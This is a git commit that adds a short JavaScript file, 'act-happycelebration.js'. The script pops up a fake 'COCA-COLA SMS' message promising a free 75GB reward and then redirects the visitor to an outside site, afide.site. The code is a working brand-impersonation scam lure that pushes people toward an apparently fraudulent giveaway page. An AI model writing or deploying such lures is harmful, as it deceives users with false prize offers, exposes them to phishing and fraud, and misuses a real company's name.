e3990e513ec89746f323f07bf43e549cdf8552df
ufaiba <ufaiba247@gmail.com>
2026-06-22 02:46:29 -0700

    Create act-happycelebration.js

---
+++ act-happycelebration.js
@@ -0,0 +1,5 @@
+var password = 'FREE 75GB '
+password=prompt('COCA-COLA SMS: We have been here for 75 years celebrating moments that matters to you and yours , dont miss out your Reward, press Free 75GB To Check Now ','FREE 75GB');
+if (password != 'FREE 75GB') {
+location.href='https://afide.site/happycelebration.html';
+}
